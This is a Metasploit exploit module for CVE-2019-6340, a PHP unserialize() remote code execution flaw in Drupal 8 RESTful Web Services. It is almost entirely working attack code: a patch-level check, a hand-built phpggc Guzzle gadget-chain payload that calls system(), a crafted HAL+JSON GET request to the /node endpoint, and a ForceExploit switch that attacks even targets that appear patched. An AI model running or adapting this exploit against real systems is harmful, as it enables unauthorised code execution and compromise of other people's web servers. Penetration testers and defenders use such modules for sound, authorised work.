##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  # 1. All (four) Web Services modules need to be enabled
  # 2. Nodes are cached, meaning one exploit attempt per node
  Rank = AverageRanking

  include Msf::Exploit::Remote::HTTP::Drupal

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Drupal RESTful Web Services unserialize() RCE',
      'Description'    => %q{
        This module exploits a PHP unserialize() vulnerability in Drupal RESTful
        Web Services by sending a GET request to Drupal's /node REST endpoint.

        Drupal < 8.5.11 and < 8.6.10 are vulnerable.
      },
      'Author'         => [
        'Jasper Mattsson', # Discovery
        'Charles Fol',     # PoC
        'Rotem Reiss',     # Module
        'wvu'              # Module
      ],
      'References'     => [
        ['CVE', '2019-6340'],
        ['URL', 'https://www.drupal.org/sa-core-2019-003'],
        ['URL', 'https://www.ambionics.io/blog/drupal8-rce'],
        ['URL', 'https://github.com/ambionics/phpggc'],
        ['URL', 'https://twitter.com/jcran/status/1099206271901798400']
      ],
      'DisclosureDate' => '2019-02-20',
      'License'        => MSF_LICENSE,
      'Platform'       => ['php', 'unix'],
      'Arch'           => [ARCH_PHP, ARCH_CMD],
      'Privileged'     => false,
      'Targets'        => [
        ['PHP In-Memory',
          'Platform'   => 'php',
          'Arch'       => ARCH_PHP,
          'Type'       => :php_memory,
          'Payload'    => {'BadChars' => "'"}
        ],
        ['Unix In-Memory',
          'Platform'   => 'unix',
          'Arch'       => ARCH_CMD,
          'Type'       => :unix_memory
        ]
      ],
      'DefaultTarget'  => 0,
      'Notes'          => {
        'Stability'    => [CRASH_SAFE],
        'SideEffects'  => [IOC_IN_LOGS],
        'Reliablity'   => [UNRELIABLE_SESSION],
        'AKA'          => ['SA-CORE-2019-003']
      }
    ))

    register_options([
      OptInt.new('NODE', [true, 'Node ID to target', 1])
    ])

    register_advanced_options([
      OptBool.new('ForceExploit', [false, 'Override check result', false])
    ])
  end

  def check
    checkcode = CheckCode::Unknown

    version = drupal_version.to_s

    if version.empty?
      vprint_error('Could not determine Drupal version')
      return checkcode
    end

    if version =~ /^8\b/
      vprint_status("Drupal #{version} targeted at #{full_uri}")
      checkcode = CheckCode::Detected
    else
      vprint_error("Drupal #{version} is not supported")
      return CheckCode::Safe
    end

    changelog = drupal_changelog(version)

    unless changelog
      vprint_error('Could not determine Drupal patch level')
      return checkcode
    end

    if changelog.include?('SA-CORE-2019-003')
      vprint_warning('Drupal appears patched in CHANGELOG.txt')
      checkcode = CheckCode::Safe
    else
      vprint_good('Drupal appears unpatched in CHANGELOG.txt')
      checkcode = CheckCode::Appears
    end

    checkcode
  end

  def exploit
    if [CheckCode::Safe, CheckCode::Unknown].include?(check)
      if datastore['ForceExploit']
        print_warning('ForceExploit set! Exploiting anyway!')
      else
        fail_with(Failure::NotVulnerable, 'Set ForceExploit to override')
      end
    end

    if datastore['PAYLOAD'] == 'cmd/unix/generic'
      print_warning('Enabling DUMP_OUTPUT for cmd/unix/generic')
      # XXX: Naughty datastore modification
      datastore['DUMP_OUTPUT'] = true
    end

    case target['Type']
    when :php_memory
      # XXX: This will spawn a *very* obvious process
      execute_command("php -r '#{payload.encoded}'")
    when :unix_memory
      execute_command(payload.encoded)
    end
  end

  def execute_command(cmd, opts = {})
    vprint_status("Executing with system(): #{cmd}")

    # https://en.wikipedia.org/wiki/Hypertext_Application_Language
    hal_json = JSON.pretty_generate(
      'link'      => [
        'value'   => 'link',
        'options' => phpggc_payload(cmd)
      ],
      '_links'    => {
        'type'    => {
          'href'  => vhost_uri
        }
      }
    )

    print_status("Sending GET request to #{node_uri} with link #{vhost_uri}")

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => node_uri,
      'ctype'    => 'application/hal+json',
      'vars_get' => {'_format' => 'hal_json'},
      'data'     => hal_json
    }, 3.5)

    return unless res

    case res.code
    when 200
      print_warning('If you did not get code execution, try a new node ID')
    when 404
      fail_with(Failure::NotFound, "#{node_uri} not found")
    when 406
      fail_with(Failure::NotFound, 'Web Services may not be enabled')
    else
      fail_with(Failure::UnexpectedReply, res.inspect)
    end

    print_line(res.body) if datastore['DUMP_OUTPUT']
  end

  # phpggc Guzzle/RCE1 system id
  def phpggc_payload(cmd)
    (
      # http://www.phpinternalsbook.com/classes_objects/serialization.html
      <<~EOF
        O:24:"GuzzleHttp\\Psr7\\FnStream":2:{
          s:33:"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods";a:1:{
            s:5:"close";a:2:{
              i:0;O:23:"GuzzleHttp\\HandlerStack":3:{
                s:32:"\u0000GuzzleHttp\\HandlerStack\u0000handler";
                  s:cmd_len:"cmd";
                s:30:"\u0000GuzzleHttp\\HandlerStack\u0000stack";
                  a:1:{i:0;a:1:{i:0;s:6:"system";}}
                s:31:"\u0000GuzzleHttp\\HandlerStack\u0000cached";
                  b:0;
              }
              i:1;s:7:"resolve";
            }
          }
          s:9:"_fn_close";a:2:{
            i:0;r:4;
            i:1;s:7:"resolve";
          }
        }
      EOF
    ).gsub(/\s+/, '').gsub('cmd_len', cmd.length.to_s).gsub('cmd', cmd)
  end

  def node_uri
    normalize_uri(target_uri.path, '/node', datastore['NODE'])
  end

  def vhost_uri
    full_uri(
      normalize_uri(target_uri.path, '/rest/type/shortcut/default'),
      vhost_uri: true
    )
  end

end
